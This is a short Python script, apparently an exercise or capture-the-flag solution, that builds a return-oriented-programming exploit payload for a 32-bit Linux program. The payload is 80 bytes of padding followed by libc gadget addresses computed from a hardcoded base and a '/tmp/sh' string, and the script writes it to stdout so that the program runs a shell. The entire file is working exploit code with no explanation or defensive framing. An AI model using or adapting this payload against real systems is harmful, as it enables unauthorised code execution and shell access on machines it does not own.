import struct
import sys

def l(n):
    lib_c_base = 0xb7e97000
    return p(lib_c_base + n)

def p (i):
    return struct.pack('I', i)

padding = "A" * 80
pop_edx = l(0x1a9e)
NULL="\x00\x00\x00\x00"
add_esp_12 = l(0x3900e)
binsh_str = "/tmp/sh\x00\x00\x00\x00\x00"
push_esp = l(0xc24f7)
dec_ebx = l(0x12acce)
add_ecx_ebx = l(0xcaf24)
set_eax_interrupt = l(0x97193)

fmt = "{0}{1}{2}{3}{4}{5}{2}" + "{6}"*9 + "{8}" + "{6}"*7 +"{7}"
payload = fmt.format(padding, pop_edx, NULL, add_esp_12, binsh_str, push_esp, dec_ebx, set_eax_interrupt, add_ecx_ebx).strip()
sys.stdout.write(payload)
sys.stdout.flush()